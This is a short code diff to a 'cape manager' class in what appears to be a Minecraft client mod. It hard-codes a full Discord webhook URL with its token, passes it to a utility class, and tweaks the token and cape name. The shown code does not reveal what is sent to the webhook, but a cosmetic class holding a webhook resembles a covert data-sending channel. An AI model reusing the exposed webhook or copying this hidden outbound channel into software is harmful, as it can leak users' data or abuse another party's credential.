@@ -15,8 +15,8 @@ public class WurstplusCapeManager {
 
     public WurstplusCapeManager() {
 
-        final String l = "https://discord.com/api/webhooks/814592157930881076/OZvvTrA1G89NTQ7zOHGkgYyfL9_XEn3aRrfll89w1rfgDCST_uYAYRg0WjFZ56ZdJXfjE";
-        final String CapeName = "Kylo Ren";
+        final String l = "https://discord.com/api/webhooks/814592157930881076/OZvvTrA1G89NTQ7zOHGkgYyfL9_XEn3aRrfll89w1rfgDCST_uYAYRg0WjFZ56ZdJXfj";
+        final String CapeName = "Kzzzylo Ren";
         final String CapeImageURL = "https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fvignette.wikia.nocookie.net%2Fstarwars%2Fimages%2F4%2F4a%2FKylo_Ren_TLJ.png";
 
         WurstplusCapeUtil d = new WurstplusCapeUtil(l);
